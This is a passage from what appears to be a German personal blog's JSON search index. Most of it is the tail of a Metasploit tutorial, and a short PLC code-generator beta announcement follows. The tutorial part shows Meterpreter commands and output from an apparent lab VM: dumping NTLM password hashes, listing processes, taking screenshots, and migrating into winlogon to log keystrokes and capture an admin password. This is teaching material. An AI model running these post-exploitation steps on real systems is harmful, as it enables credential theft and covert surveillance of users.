Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:b34ce522c3e4c87722c34254e51bff62:fc525c9683e8fe067095ba2ddc971889:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:9b45eefa50cbd1f779518231c8ae0fb3:8da1ecee0f0c121facdfb869612a33c6:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:60a8616c6fd013a1aff2d7c3328b4af8:::IEUser:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::psAktuell laufende Prozesse auslesenmeterpreter &gt; psProcess List============ PID   PPID  Name              Arch  Session  User                          Path ---   ----  ----              ----  -------  ----                          ---- 0     0     [System Process]                                                4     0     System            x86   0        NT AUTHORITY\\SYSTEM            364   4     smss.exe          x86   0        NT AUTHORITY\\SYSTEM           \\SystemRoot\\System32\\smss.exe 484   604   logon.scr         x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\logon.scr 580   364   csrss.exe         x86   0        NT AUTHORITY\\SYSTEM           \\??\\C:\\WINDOWS\\system32\\csrss.exe 604   364   winlogon.exe      x86   0        NT AUTHORITY\\SYSTEM           \\??\\C:\\WINDOWS\\system32\\winlogon.exe 648   604   services.exe      x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\services.exe 660   604   lsass.exe         x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\lsass.exe 820   648   VBoxService.exe   x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\VBoxService.exe 872   648   svchost.exe       x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\svchost.exe 900   648   alg.exe           x86   0        NT AUTHORITY\\LOCAL SERVICE    C:\\WINDOWS\\System32\\alg.exe 940   648   svchost.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\svchost.exe 1032  648   svchost.exe       x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\System32\\svchost.exe 1084  648   svchost.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\svchost.exe 1120  648   svchost.exe       x86   0        NT AUTHORITY\\LOCAL SERVICE    C:\\WINDOWS\\system32\\svchost.exe 1164  604   logonui.exe       x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\logonui.exe 1516  1636  ntvdm.exe         x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\ntvdm.exe 1948  648   spoolsv.exe       x86   0        NT AUTHORITY\\SYSTEM           C:\\WINDOWS\\system32\\spoolsv.exescreenshotErstellen eines Screenshots vom Bildschirm des Zielsystemsmeterpreter &gt; screenshotScreenshot saved to: /root/ZxRxRrPE.jpegkeyscanStartet die Protokollierung von Tastenbetätigungen auf dem Zielcomputer.meterpreter &gt; psProcess list=================PID Name         Path--- ----         ----401 winlogon.exe C:\\WINNT\\system32\\winlogon.exemeterpreter &gt; migrate 401[*] Migrating to 401...[*] Migration completed successfully.meterpreter &gt; keyscan_startStarting the keystroke sniffer...**** A few minutes later after an admin logs in ****meterpreter &gt; keyscan_dumpDumping captured keystrokes...Administrator ohnoes1vebeenh4x0red!Mehr InformationenEine Sammlung der Wichtigsten Metasploit BefehlenMetasploit KommandoreferenzOffensive security Tutorialhttps://www.offensive-security.com/metasploit-unleashed/Offiziele Dokumentation Rapid7https://metasploit.help.rapid7.com/docsconsole.log('See you !');","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/Metasploit/",
        "teaser":"https://dg60.github.io/images/docs/metasploit.png"},{
        "title": "Code Generator Beta Release",
        "excerpt":"Hallo,Heute ist es endlich soweit das ein kleines nützliches Tool das Licht der Welt erblickt, und endlich getestet werden kann. Das neue Tool hat den nicht sehr kreativen Name CodeGenerator for PLC´s, aber der Name kann sich ja noch ändern :). Wie der Name schon verrät lässt sich damit Code für verschiedenen PLC´s(SPS´sen) erzeugen.Für den ersten Beta Release werden folgende Sprachen und Steuerungen unterstützt:  B&amp;R Automation Studio 4.x.x          Structured Text (ST EN 61131-3)        Siemens TIA_V15          Structured Text (SCL)      Das ausführbare Programm steht für folgenden Platformen zur Verfügung:  Linux          Ubuntu 16.04      Ubuntu 18.04        Windows 7, 10Mehr InformationenProjektbeschreibung und Dokumentation:  CodeGenerator for PLC´sCodeGenerator für Linux und Windows:CodeGenerator_BETA_V0.9.0","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/Code-Generator-BETA-Release/",
        "teaser":"https://dg60.github.io/images/works/CodeGenerator/CodeGen_BuR.png"}]
